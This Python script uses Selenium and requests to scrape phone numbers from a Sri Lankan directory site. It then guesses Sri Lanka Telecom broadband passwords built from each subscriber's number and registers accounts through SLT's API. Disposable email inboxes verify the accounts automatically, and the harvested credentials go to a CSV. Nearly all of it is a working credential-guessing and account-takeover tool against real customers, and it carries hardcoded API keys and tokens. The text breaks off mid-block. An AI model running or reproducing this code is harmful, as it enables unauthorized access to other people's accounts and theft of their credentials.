import time
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.keys import Keys
import time
import random
import csv
import requests
import json
import urllib3
import sys
from password_generator import PasswordGenerator

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
pwo = PasswordGenerator()
#make the browser
browser = webdriver.Chrome('chromedriver')
#created account counter
counter = 0

time.sleep(4)
sys.stdout.write("Opening" )
for i in range(random.randint(10,20)):
    sys.stdout.write("." )
    time.sleep(0.2)
    sys.stdout.flush()
    
location = input('\nEnter location (Ex: Ja ela, Wattala, Galle, Matara) : ')
locationCode = input('Enter location code (Ex: JL, MLB, WT) : ')
try:
    pageEnd = int(input('Enter last web page number : '))
except:
    print ("Tahudu wenna othanata denna one hari illakama dan napan aaye run karapan bye")
    input('Press enter')
    exit()

print('This Method check both ADSL and Fiber \n Stating Now \n Feel free and [Gihin film ekak balapan] \n')

file_open = open('output.csv','a', newline='')
file_writer = csv.writer(file_open)
#file_writer.writerow()

#urls
sltUrl = "https://omniscapp.slt.lk/mobitelint/slt/sltvasservices/register"
#headers
sltHeader = {
        "Cache-Control":"no-cache",
        "x-ibm-client-id":"622cc49f-6067-415e-82cd-04b1b76f6377",
        "Content-Type":"application/json; charset=UTF-8",
        "Content-Length":"158",
        "Host":"omniscapp.slt.lk",
        "Connection":"Keep-Alive",
        "Accept-Encoding":"gzip",
        "User-Agent":"okhttp/3.11.0"
        }

emaiHeader = {
        "accept": "application/json",
        "X-MailboxToken":"67BAEA44E0FFAF6B6DC2E983EF2AA828E7A66250"
        }

response = email_r_json =email=emailToken=""

response = requests.put("https://www.developermail.com/api/v1/mailbox")
email_r_json = response.json()
email = email_r_json['result']['name']+"@developermail.com"
emailToken = email_r_json['result']['token']

#slt variables
elem =""
splited= number = name =tpnum=username=password= payload= sltResponse=sltJson= password=browser2=""

#start the program
#make for loop for number get check and other process
for i in range(1,pageEnd):
    browser.get("https://rainbowpages.lk/personal-names.php?page="+str(i)+"&s=*a*&l="+location)
    elem = browser.find_elements_by_class_name("single-product")
    for element in elem:
        splited = element.text.split("\n")
        number = splited[len(splited)-1]
        name = splited[0]
        tpnum = number
        password = pwo.shuffle_password('A1aH2nB3hT40y9B587g6',15)

        #check ADSL
        username = locationCode + tpnum[3:]
        payload = {
                "bbpassword":"********",
                "email":email,
                "fullName":"slt resistencia",
                "mobile":"0711111111",
                "vaspassword":"SunWillShine123",
                "subscriberid":username
        }

        sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
        sltJson = sltResponse.json()

        if "password" in sltJson['message']:
            #here do the creation try thing ADSL
            payload = {
                "bbpassword": locationCode+username[-3:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()
            
            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  locationCode+username[-3:], password, email, emailToken])
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": locationCode+username[-4:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()
            
            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  locationCode+username[-4:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": locationCode+username[-5:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()
            

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  locationCode+username[-5:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": locationCode+username[-6:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()
            

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  locationCode+username[-6:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": locationCode+username[-7:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()
            

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  locationCode+username[-7:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": locationCode+username[-8:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()
            

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  locationCode+username[-8:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": username[-4:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()
            

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  username[-4:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": username[-5:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()
            

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  username[-5:], password, email, emailToken])
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": username[-6:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()
            

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  username[-6:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": username[-7:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()
            

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  username[-7:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue
            
            payload = {
                "bbpassword": username[-8:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()
            

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  username[-8:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue
            
        else:
            #check the Fiber
            splited = element.text.split("\n")
            number = splited[len(splited)-1]
            name = splited[0]
            tpnum = number

            username = "94" + tpnum[1:]
            payload = {
                    "bbpassword":"********",
                    "email":"sltresistencia@gmail.com",
                    "fullName":"slt resistencia",
                    "mobile":"0711111111",
                    "vaspassword":"WhNjUyhB3",
                    "subscriberid":username
            }

            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()

            if 'password' in sltJson['message']:
                payload = {
                "bbpassword":"********",
                "email":email,
                "fullName":"slt resistencia",
                "mobile":"0711111111",
                "vaspassword":"SunWillShine123",
                "subscriberid":username
        }

        sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
        sltJson = sltResponse.json()

        if "password" in sltJson['message']:
            #here do the creation try thing ADSL
            payload = {
                "bbpassword": username[-10:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  username[-10:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": username[-9:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  username[-9:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": username[-8:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  username[-8:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": username[-7:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  username[-7:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": username[-6:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  username[-6:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": username[-5:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  username[-5:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": username[-4:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  username[-4:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": "94"+username[-3:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  "94"+username[-3:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": "94"+username[-4:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username,  "94"+username[-4:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
